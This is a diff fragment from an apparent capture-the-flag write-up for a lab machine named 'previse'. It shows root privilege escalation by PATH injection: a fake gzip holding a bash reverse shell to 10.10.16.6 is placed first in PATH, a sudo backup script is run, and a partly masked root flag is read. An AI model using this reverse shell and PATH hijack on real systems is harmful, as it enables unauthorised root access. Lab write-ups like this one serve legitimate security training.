@@ -369,3 +369,24 @@
     gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
     gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
 
+// We can execute path injection
+
+// Lets check the current path of gzip
+
+    m4lwhere@previse:~$ which gzip
+    /bin/gzip
+
+// 
+
+    m4lwhere@previse:~$ cd /tmp/
+    m4lwhere@previse:/tmp$ echo "bash -i >& /dev/tcp/10.10.16.6/1444 0>&1" > gzip  
+    m4lwhere@previse:/tmp$ chmod +x gzip 
+    m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH 
+    m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
+
+// and we got root flag !
+
+    root@previse:/root# cat root.txt
+    cat root.txt
+    a74e70.................
+    
